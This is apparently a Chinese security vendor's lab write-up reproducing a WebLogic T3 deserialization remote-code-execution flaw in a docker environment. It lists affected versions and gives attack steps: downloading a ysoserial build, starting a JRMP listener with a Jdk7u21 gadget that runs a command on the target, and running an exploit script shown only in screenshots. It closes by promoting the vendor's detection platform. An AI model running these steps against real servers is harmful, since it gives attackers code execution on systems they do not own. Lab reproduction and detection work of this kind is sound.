## 漏洞描述：

Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic
Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机.
T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化,
实现对存在漏洞的weblogic组件的远程代码执行攻击。

## 影响版本：

Oracle Weblogic Server10.3.6.0.0

Oracle Weblogic Server12.1.3.0.0

Oracle Weblogic Server12.2.1.2.0

Oracle Weblogic Server12.2.1.3.0

## 复现步骤：

  1. 启动漏洞环境

命令：docker-compose up -d

![1603423385_5f924c994b641ff592d4e.png!small?1603423385829](https://image.3001.net/images/20201023/1603423385_5f924c994b641ff592d4e.png!small?1603423385829)

  2. 下载反序列化工具

命令：

    
    
    wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar

![1603423438_5f924cceb6e7f371e548a.png!small?1603423439417](https://image.3001.net/images/20201023/1603423438_5f924cceb6e7f371e548a.png!small?1603423439417)

  3. 启动JRMP Server，利用监听在连接成功后靶机上创建jadoreshell

命令：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
ysoserial.exploit.JRMPListener 8889 Jdk7u21 "touch /tmp/jadoreshell"

![1603423476_5f924cf4392090ead79e4.png!small?1603423477023](https://image.3001.net/images/20201023/1603423476_5f924cf4392090ead79e4.png!small?1603423477023)

  4. 使用ysoserial-0.1-cve-2018-2628-all.jar工具生成一个payload字符串，因为要实现Weblogic远程调用攻击机主机上的方法。就需要知道远程方法所在的主机地址和端口号。所以在上一步要记录攻击主机的信息。![1603423486_5f924cfe4df74e36de35a.png!small?1603423486927](https://image.3001.net/images/20201023/1603423486_5f924cfe4df74e36de35a.png!small?1603423486927)
  5. 替换脚本里的payload以及目标IP地址![1603423497_5f924d09b6a7ddd462690.png!small?1603423498260](https://image.3001.net/images/20201023/1603423497_5f924d09b6a7ddd462690.png!small?1603423498260)![1603423503_5f924d0fb6ce2a06a68c8.png!small?1603423504508](https://image.3001.net/images/20201023/1603423503_5f924d0fb6ce2a06a68c8.png!small?1603423504508)
  6. 执行python脚本![1603423522_5f924d22de1ab451395f7.png!small?1603423524007](https://image.3001.net/images/20201023/1603423522_5f924d22de1ab451395f7.png!small?1603423524007)![1603423530_5f924d2aaf382c396ca9e.png!small?1603423531677](https://image.3001.net/images/20201023/1603423530_5f924d2aaf382c396ca9e.png!small?1603423531677)  

  7. 查看是否写入文本文件

命令：dockers
ps![1603423545_5f924d397f9189ef04f26.png!small?1603423546209](https://image.3001.net/images/20201023/1603423545_5f924d397f9189ef04f26.png!small?1603423546209)

命令：docker exec -ti cve-2018-2628_weblogic_1 /bin/bash

命令：ls -al
/tmp![1603423552_5f924d4030893f0cf766a.png!small?1603423552859](https://image.3001.net/images/20201023/1603423552_5f924d4030893f0cf766a.png!small?1603423552859)

文件写入成功

## 产品解决与支持：

华云安灵洞®威胁与漏洞管理平台（Ai.Vul）已经支持一键检测该漏洞。

![1603423558_5f924d469d8ae2b3d739c.png!small?1603423559237](https://image.3001.net/images/20201023/1603423558_5f924d469d8ae2b3d739c.png!small?1603423559237)

![1603423566_5f924d4e4882964e17709.png!small?1603423566937](https://image.3001.net/images/20201023/1603423566_5f924d4e4882964e17709.png!small?1603423566937)

